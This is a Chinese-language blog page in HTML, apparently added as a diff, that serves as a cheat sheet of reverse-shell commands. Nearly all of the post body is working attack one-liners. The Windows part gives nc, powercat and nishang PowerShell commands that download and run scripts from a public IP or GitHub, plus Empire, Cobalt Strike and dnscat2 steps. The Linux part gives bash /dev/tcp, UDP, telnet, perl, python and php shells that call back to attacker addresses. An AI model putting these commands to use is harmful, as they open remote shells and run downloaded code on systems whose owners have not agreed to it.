@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>常用反弹shell | 小白帽</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="">
+    <meta name="description" content="附件 powercat.ps1 链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1jXtHBNjy224RJPbojvNFZA提取码：x6gx   windowsnc1nc -e cmd.exe 192.168.31.86 1234  powercat1powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="常用反弹shell">
+<meta property="og:url" content="https://www.yuque.com/xiaogege-yxttw/2020/08/29/fantanshell/index.html">
+<meta property="og:site_name" content="小白帽">
+<meta property="og:description" content="附件 powercat.ps1 链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1jXtHBNjy224RJPbojvNFZA提取码：x6gx   windowsnc1nc -e cmd.exe 192.168.31.86 1234  powercat1powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-08-29T03:12:41.000Z">
+<meta property="article:modified_time" content="2020-09-13T15:42:01.974Z">
+<meta property="article:author" content="无名之辈">
+<meta name="twitter:card" content="summary">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">无名之辈</h5>
+          <a href="mailto:3389006233@qq.com" title="3389006233@qq.com" class="mail">3389006233@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/wakaka123wakaka" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">常用反弹shell</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">常用反弹shell</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-08-29T03:12:41.000Z" itemprop="datePublished" class="page-time">
+  2020-08-29
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+<meta name="referrer" content="no-referrer" />
+<script type="text/javascript" src="hexo_resize_image.js"></script>
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#windows"><span class="post-toc-number">1.</span> <span class="post-toc-text">windows</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#nc"><span class="post-toc-number">1.0.1.</span> <span class="post-toc-text">nc</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#powercat"><span class="post-toc-number">1.0.2.</span> <span class="post-toc-text">powercat</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#msf"><span class="post-toc-number">1.0.3.</span> <span class="post-toc-text">msf</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#cobalt-strike"><span class="post-toc-number">1.0.4.</span> <span class="post-toc-text">cobalt strike</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Empire"><span class="post-toc-number">1.0.5.</span> <span class="post-toc-text">Empire</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#nishang"><span class="post-toc-number">1.0.6.</span> <span class="post-toc-text">nishang</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Dnscat"><span class="post-toc-number">1.0.7.</span> <span class="post-toc-text">Dnscat</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#liunx"><span class="post-toc-number">2.</span> <span class="post-toc-text">liunx</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#bash"><span class="post-toc-number">2.0.1.</span> <span class="post-toc-text">bash</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#TCP"><span class="post-toc-number">2.0.1.0.1.</span> <span class="post-toc-text">TCP</span></a></li><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#UDP"><span class="post-toc-number">2.0.1.0.2.</span> <span class="post-toc-text">UDP</span></a></li><li class="post-toc-item post-toc-level-6"><a class="post-toc-link" href="#telnet"><span class="post-toc-number">2.0.1.0.3.</span> <span class="post-toc-text">telnet</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#perl"><span class="post-toc-number">2.0.2.</span> <span class="post-toc-text">perl</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#python"><span class="post-toc-number">2.0.3.</span> <span class="post-toc-text">python</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#php"><span class="post-toc-number">2.0.4.</span> <span class="post-toc-text">php</span></a></li></ol></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-fantanshell"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">常用反弹shell</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-08-29 11:12:41" datetime="2020-08-29T03:12:41.000Z"  itemprop="datePublished">2020-08-29</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <ul>
+<li><p>附件</p>
+<p>powercat.ps1 链接：<a href="https://pan.baidu.com/s/1jXtHBNjy224RJPbojvNFZA" target="_blank" rel="noopener">https://pan.baidu.com/s/1jXtHBNjy224RJPbojvNFZA</a>提取码：x6gx</p>
+</li>
+</ul>
+<h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e cmd.exe 192.168.31.86 1234</span><br></pre></td></tr></table></figure>
+
+<h4 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;http:&#x2F;&#x2F;122.51.93.116:8080&#x2F;powercat.ps1&#39;);powercat -c 122.51.93.116 -p 1234 -e cmd.exe</span><br></pre></td></tr></table></figure>
+
+<h4 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">略</span><br></pre></td></tr></table></figure>
+
+<h4 id="cobalt-strike"><a href="#cobalt-strike" class="headerlink" title="cobalt strike"></a>cobalt strike</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击--生成后门--Windows Executable（s）--输出powershell--目标机执行命令</span><br></pre></td></tr></table></figure>
+
+<h4 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">usestager windows&#x2F;launcher_vbs</span><br><span class="line">info</span><br><span class="line">set Listener test</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<h4 id="nishang"><a href="#nishang" class="headerlink" title="nishang"></a>nishang</h4><p><a href="https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1" target="_blank" rel="noopener">Invoke-PowerShellTcp_2.ps1</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com    &#x2F;samratashok&#x2F;nishang&#x2F;9a3c747bcf535ef82dc4c5c66aac36db47c2afde&#x2F;Shells&#x2F;Invoke-PowerShellTcp.ps1&#39;); Invoke-PowerShellTcp -Reverse -IPAddress 10.1.1.210 -port 1234</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellUdp.ps1" target="_blank" rel="noopener">Invoke-PowerShellUdp.ps1</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object      Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;samratashok&#x2F;nishang&#x2F;9a3c747bcf535ef82dc4c5c66aac36db47c2afde&#x2F;Shells&#x2F;Invoke-PowerShellUdp.ps1&#39;);</span><br><span class="line">Invoke-PowerShellUdp -Reverse -IPAddress 10.1.1.210 -port 1234</span><br></pre></td></tr></table></figure>
+
+<h4 id="Dnscat"><a href="#Dnscat" class="headerlink" title="Dnscat"></a><a href="https://github.com/iagox86/dnscat2" target="_blank" rel="noopener">Dnscat</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">服务端：</span><br><span class="line">ruby dnscat2.rb --dns &quot;domain&#x3D;lltest.com,host&#x3D;xx.xx.xx.xx&quot; --no-cache -e open -e open</span><br><span class="line">目标主机：</span><br><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;lukebaggett&#x2F;dnscat2-powershell&#x2F;master&#x2F;dnscat2.ps1&#39;);Start-Dnscat2 -Domain lltest.com -DNSServer xx.xx.xx.xx</span><br></pre></td></tr></table></figure>
+
+<h2 id="liunx"><a href="#liunx" class="headerlink" title="liunx"></a>liunx</h2><h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h4><h6 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 1234</span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.8.106&#x2F;1234 0&gt;&amp;1  #适合redhat系列,不建议用exec,兼容性并不好</span><br><span class="line">&#x2F;bin&#x2F;bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;192.168.56.212&#x2F;1234 0&lt;&amp; 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<h6 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -u -lvp 1234														# -u表示采用udp监听</span><br><span class="line">sh -i &gt;&amp; &#x2F;dev&#x2F;udp&#x2F;192.168.31.192&#x2F;1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<h6 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">延迟片刻，等1234和1235均产生内容了在1234输入命令，在1235输出内容</span><br><span class="line">telnet 192.168.31.192 1234 | &#x2F;bin&#x2F;bash | telnet 192.168.31.192 1235</span><br></pre></td></tr></table></figure>
+
+<h4 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;192.168.8.106&quot;;$p&#x3D;1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure>
+
+<h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;192.168.99.242&#39;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;192.168.99.242&quot;,1234);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzIyNDkwNjQ5Ng==∣=2247484048&idx=4&sn=7140853213ae2fec77f5dfcd762f8279&chksm=e8069effdf7117e9197bd4c0b5263d917aa76a29952b88a0dcd57a00d6e4cbd53befefb81d36&mpshare=1&scene=24&srcid=0828NuJLluygMLDcuQAeKCWe&sharer_sharetime=1598624151014&sharer_shareid=f082bd6e4afa0b021ff0cb8b0db46ed5&key=018eb7afa591f40fd7757dd3a419407af7db054f2c6a38760d865fbd79fe15a3deb885f5b81df11e7cfcd386c666a1a933f53cf84302ed6ac7fc594a5b5136875f5323d2a0103a9ec30dfface6988f849e640029c01ce20d4a1058a36325ce2ad7cae18199c6b2bb9607c623534492cc9fc6d575e921b8d33e398a61702b38c3&ascene=14&uin=OTc1NzE1Nzgw&devicetype=Windows+10+x64&version=6209007b⟨=zh_CN&exportkey=A639KHm%2B5WsP4j3HS5e1y5Y%3D&pass_ticket=ImkeWqF%2BPM60%2FUx4K85LPDI1Wt8e9L7KrYUm4dFiVn6mSfFiyPpFAzOm1UN6%2FRbu" target="_blank" rel="noopener">来源</a><br><a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">反弹编码</a></p>
+<p>——————————————————<strong><em><a href="https://hack123.pw/" target="_blank" rel="noopener">无名之辈</a></em></strong>——————————————————-</p>
+<hr>
+<p><sub>本文档由<a href="https://www.yuque.com/waquehq">瓦雀</a>创建</sub></p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2020-09-13T15:42:01.974Z" itemprop="dateUpdated">2020-09-13 23:42:01</time>
+</span><br>
+
+
+        
+        这里可以写作者留言，标签和 hexo 中所有变量及辅助函数等均可调用，示例：<a href="/2020/08/29/fantanshell/" target="_blank" rel="external">https://www.yuque.com/xiaogege-yxttw/2020/08/29/fantanshell/</a>
+        
+    </div>
+    
+    <footer>
+        <a href="https://www.yuque.com/xiaogege-yxttw">
+            <img src="/img/avatar.jpg" alt="无名之辈">
+            无名之辈
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.yuque.com/xiaogege-yxttw/2020/08/29/fantanshell/&title=《常用反弹shell》 — 小白帽&pic=https://www.yuque.com/xiaogege-yxttw/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.yuque.com/xiaogege-yxttw/2020/08/29/fantanshell/&title=《常用反弹shell》 — 小白帽&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://www.yuque.com/xiaogege-yxttw/2020/08/29/fantanshell/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《常用反弹shell》 — 小白帽&url=https://www.yuque.com/xiaogege-yxttw/2020/08/29/fantanshell/&via=https://www.yuque.com/xiaogege-yxttw" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://www.yuque.com/xiaogege-yxttw/2020/08/29/fantanshell/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2020/08/29/tongda/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">通达OA</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/08/28/ew/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">内网渗透-ew</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.jpg" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>无名之辈 &copy; 2020</span>
+            <span>
+                
+                <a href="http://www.miitbeian.gov.cn/" target="_blank">蜀ICP备巴啦啦小魔仙</a><br>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+	<center><span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span></center>
+		<script>
+				var now = new Date(); 
+					function createtime() { 
+                    var grt= new Date("01/07/2020 17:38:00");//在此处修改你的建站时间
+                    now.setTime(now.getTime()+250); 
+                    days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+                    hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+                    if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+                    mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+                    seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+                    snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+                    document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "; 
+                    document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+											} 
+			setInterval("createtime()",250);
+		</script>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.yuque.com/xiaogege-yxttw/2020/08/29/fantanshell/&title=《常用反弹shell》 — 小白帽&pic=https://www.yuque.com/xiaogege-yxttw/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.yuque.com/xiaogege-yxttw/2020/08/29/fantanshell/&title=《常用反弹shell》 — 小白帽&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://www.yuque.com/xiaogege-yxttw/2020/08/29/fantanshell/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《常用反弹shell》 — 小白帽&url=https://www.yuque.com/xiaogege-yxttw/2020/08/29/fantanshell/&via=https://www.yuque.com/xiaogege-yxttw" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://www.yuque.com/xiaogege-yxttw/2020/08/29/fantanshell/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACMUlEQVR42u3azY6DMAxF4b7/S3e2laak59phgXNYVZSBfFTy+CevFz7eH8fnmavPV99eXbM+v+2QIUPGYxnv5bG+5mqh/+/P8eS5X54oQ4aMAxjp49Nv18GUUH+sWYYMGTJAunaV6vHwKkOGDBl3BNy0fOXVqAwZMmTUitg04K6fUntlG2pxGTJkPJDRCYJ3f75lviFDhoxHMd7hkaaJnXZbsCoZMmSMZqRpH0/s0iFoutlChgwZ5zBIEKwh19TgHZO/lSFDxmhGp6VFBgP8+jTd/HJGhgwZoxmdwWRx3BiWr8E/AxkyZIxjpGNL3lYjyG2FrgwZMkYzagkcD7675qutoaYMGTIGMdIkjyeR6RmOucxwZciQMZSRBjvexK8tkdxThgwZ5zBqW7tqYwOeOG7uF8qQIeOxjDRckmEnL1951EfNNRkyZAxl1LpVxRwTJHnpxrLLp8uQIWMQozZW3NWG678aGTJknMPgmy14kZmmlWnYbe0ZkSFDxqMYneXumjzcMoOVIUPGAYxOg2xXUhgPD2TIkHEAo9ar47C0GC4OMmXIkDGasSbxRfA71DbfBzMNGTJkjGDU2l58WxgPxOtVod9BhgwZQxlpmOu3xmoD0TRxlCFDxjwGD7Ic1gmUPH2UIUPGaYz+Unhbv5P2oVpchgwZMnBjjiyRU4s+GTJkHMlIxwatxfEyWIYMGQcw+gPIYGNEOKJAr0OGDBmjGf28Kw216Yh021BThgwZz2P8AZTMX10IslZ+AAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+lazyScripts.push('//s95.cnzz.com/z_stat.php?id=1279224744&web_id=1279224744')
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+	<script type="text/javascript" src="hexo_resize_image.js"></script>
+</body>
+</html>
